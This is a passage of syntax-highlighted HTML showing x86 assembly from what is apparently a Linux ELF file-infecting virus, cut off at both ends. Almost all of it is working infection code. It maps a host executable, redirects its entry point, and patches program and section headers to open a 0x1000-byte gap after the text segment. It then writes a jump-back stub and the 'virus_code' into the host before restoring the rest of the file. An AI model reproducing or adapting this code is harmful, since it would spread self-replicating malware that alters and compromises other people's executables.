          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; fd</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; original file size</span><span class="sc0">

          </span><span class="sc1">; truncating to original size</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sys.ftruncate</span><span class="sc0">

</span><span class="sc5">back</span><span class="sc4">:</span><span class="sc0">         
                  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">SZ_EHDR</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close2</span><span class="sc0">


</span><span class="sc5">ok_mmap</span><span class="sc4">:</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">28</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; storing map</span><span class="sc0">
                                                          </span><span class="sc1">; address</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">; vir size</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; mmap addr</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0x1c</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; offset to first</span><span class="sc0">
                                                          </span><span class="sc1">; byte of phdr section</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">*</span><span class="sc5">TEXT_SECT</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; p_filesz</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">*</span><span class="sc5">TEXT_SECT</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; p_vaddr</span><span class="sc0">
          
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; p_filesz+p_vaddr</span><span class="sc0">
                  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">
          </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,~</span><span class="sc2">15</span><span class="sc0">


          </span><span class="sc1">; saving old entry point...</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; map addr</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">E_ENTRY</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; old e_entry</span><span class="sc0">

          </span><span class="sc1">; writting/saving new entry point(ecx)...</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">E_ENTRY</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; ecx=new e_entry</span><span class="sc0">
          

          </span><span class="sc1">; patching e_phoff...</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; mmap addr</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0x1c</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; off to pht</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">44</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; save old e_phoff</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; old p_filesz</span><span class="sc0">
                      
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">; move to first byte of phdr</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">*</span><span class="sc5">TEXT_SECT</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; ecx = p_filesz</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; (old)p_filesz</span><span class="sc0">


          </span><span class="sc1">; patching p_filesz</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; vir size</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">*</span><span class="sc5">TEXT_SECT</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc2">0x1000</span><span class="sc0">  </span><span class="sc1">; patch p_filesz</span><span class="sc0">
          
          </span><span class="sc1">; patching p_memsz </span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">*</span><span class="sc5">TEXT_SECT</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc2">0x1000</span><span class="sc0">  </span><span class="sc1">; patch p_memsz </span><span class="sc0">

                  
          </span><span class="sc1">; saving e_phnum...</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0x2c</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0xffff</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; ecx = e_phnum</span><span class="sc0">
         
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; edx = ptr mapped file</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">44</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; old e_phoff</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; move to phdr[0]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0x1000</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; (old)p_filesz</span><span class="sc0">
          
           

</span><span class="sc5">update_phdr</span><span class="sc4">:</span><span class="sc0">
          
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; compare if</span><span class="sc0">
                                                        </span><span class="sc1">; p_offset &gt;= end of codes segment ( (old)p_filesz)</span><span class="sc0">
          </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">next_phdr</span><span class="sc0">
          
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">; patch p_offset</span><span class="sc0">
          
          
</span><span class="sc5">next_phdr</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                           </span><span class="sc1">; next entry</span><span class="sc0">
          </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">update_phdr</span><span class="sc0">
          
         
          
          </span><span class="sc1">; patching e_shoff...</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; map addr</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; e_shoff </span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">44</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; saving old e_shoff</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; old p_filesz </span><span class="sc0">
                  
          </span><span class="sc1">; patch e_shoff</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">               </span><span class="sc1">; patch e_shoff</span><span class="sc0">
          
          
                    
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; mmap addr</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                           </span><span class="sc1">; (old)e_shoff</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                           </span><span class="sc1">; move to first byte</span><span class="sc0">
                                                        </span><span class="sc1">; of shdr[0]                        </span><span class="sc0">
          
                  </span><span class="sc1">; saving e_phnum...</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">30h</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0xffff</span><span class="sc0">                        </span><span class="sc1">; eax = e_shnum</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">; ecx = e_shnum</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; old p_filesz   </span><span class="sc0">
</span><span class="sc5">update_shdr</span><span class="sc4">:</span><span class="sc0">      
                  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; if sh_offset &gt;= p_filesz</span><span class="sc0">
          </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">do_patch</span><span class="sc0">                         </span><span class="sc1">; then jump to do_patch</span><span class="sc0">
          
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; sh_size</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">; if sh_offset +</span><span class="sc0">
                                                       </span><span class="sc1">; sh_size == (old)p_filesz</span><span class="sc0">
          
          </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">patch_sh_size</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_shdr</span><span class="sc0">                        </span><span class="sc1">; else jump to next section</span><span class="sc0">
          
</span><span class="sc5">patch_sh_size</span><span class="sc4">:</span><span class="sc0">
                 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0x1000</span><span class="sc0">                        </span><span class="sc1">; increasing lenght</span><span class="sc0">
                                                       </span><span class="sc1">; of .rodata</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_shdr</span><span class="sc0">                     
          
</span><span class="sc5">do_patch</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc2">0x1000</span><span class="sc0">            </span><span class="sc1">; patch sh_offset  </span><span class="sc0">
                 

</span><span class="sc5">next_shdr</span><span class="sc4">:</span><span class="sc0">   

                 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                           </span><span class="sc1">; next entry in the SHT</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">update_shdr</span><span class="sc0">

</span><span class="sc5">go_baby</span><span class="sc4">:</span><span class="sc0"> 
         
                 </span><span class="sc1">; seeking to beginning of file...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; fd </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">; beginning of file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">; SEEK_SET</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sys.lseek</span><span class="sc0">
                 
         
                </span><span class="sc1">; seeking to end of code segment ((old)p_filesz)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sys.lseek</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; original file size</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sys.lseek</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sys.read</span><span class="sc0">
        
</span><span class="sc5">write_virus</span><span class="sc4">:</span><span class="sc0"> 
                </span><span class="sc1">; now we must seek again in the file ...but this time with</span><span class="sc0">
                </span><span class="sc1">; an aligned offset , needed to insert our virus properly</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,~</span><span class="sc2">15</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; save edx temporarly to esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">; SEEK_SET</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sys.lseek</span><span class="sc0">
                
        </span><span class="sc1">; writting : "push ..."</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">pushy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sys.write</span><span class="sc0">
        
        </span><span class="sc1">; writting : "[original entry point]" .--&gt; "push [original e_entry]"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sys.write</span><span class="sc0">
            
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">virus_code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">vircode_len</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sys.write</span><span class="sc0">
        
</span><span class="sc5">write_rest</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">; now we must write the rest of the file...</span><span class="sc0">
        
        </span><span class="sc1">; now we must seek after the virus code to insert the rest</span><span class="sc0">
                </span><span class="sc1">; of the file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0x1000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sys.lseek</span><span class="sc0">
                
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
